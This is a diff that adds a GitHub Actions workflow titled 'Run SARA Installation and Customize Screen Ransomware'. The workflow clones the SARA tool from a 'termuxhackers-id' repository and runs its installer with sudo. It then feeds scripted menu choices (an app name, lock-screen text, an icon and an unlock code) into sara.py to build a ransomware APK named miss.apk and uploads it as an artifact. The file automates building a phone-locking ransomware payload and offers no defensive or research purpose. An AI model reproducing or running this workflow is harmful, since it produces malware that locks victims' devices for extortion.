@@ -1,0 +1,52 @@
+name: Run SARA Installation and Customize Screen Ransomware
+
+on:
+  push:
+    branches:
+      - main
+  pull_request:
+    branches:
+      - main
+
+jobs:
+  install-sara:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v3
+
+    - name: Install dependencies and run SARA with custom config
+      run: |
+        # Clone the SARA repository
+        git clone https://github.com/termuxhackers-id/SARA
+        cd SARA
+        # Install dependencies
+        sudo bash install.sh
+        # Automatically select option 3 and fill in custom configuration
+        echo -e "3\nmiss\nswati\nhellow word\nrobot.png\n12345678\n2" | python3 sara.py || true
+        
+        # Check if miss.apk was created
+        if [ ! -f miss.apk ]; then
+          echo "Error: miss.apk was not created."
+          exit 1
+        fi
+        echo "APK created successfully."
+
+    - name: List files for debugging
+      run: |
+        echo "Current directory contents:"
+        ls -la ./SARA  # Adjust if necessary to show the correct directory
+
+    - name: Upload APK as artifact
+      if: success()  # Only upload if previous steps succeeded
+      uses: actions/upload-artifact@v3
+      with:
+        name: miss.apk
+        path: ./SARA/miss.apk  # Ensure this is the correct path to the APK
+        retention-days: 1  # Keep the artifact for 1 day
+      continue-on-error: true  # Ignore the upload error if it occurs
+
+    - name: Clean up old artifacts (optional)
+      run: |
+        echo "This step can be used to clean up old artifacts if needed."
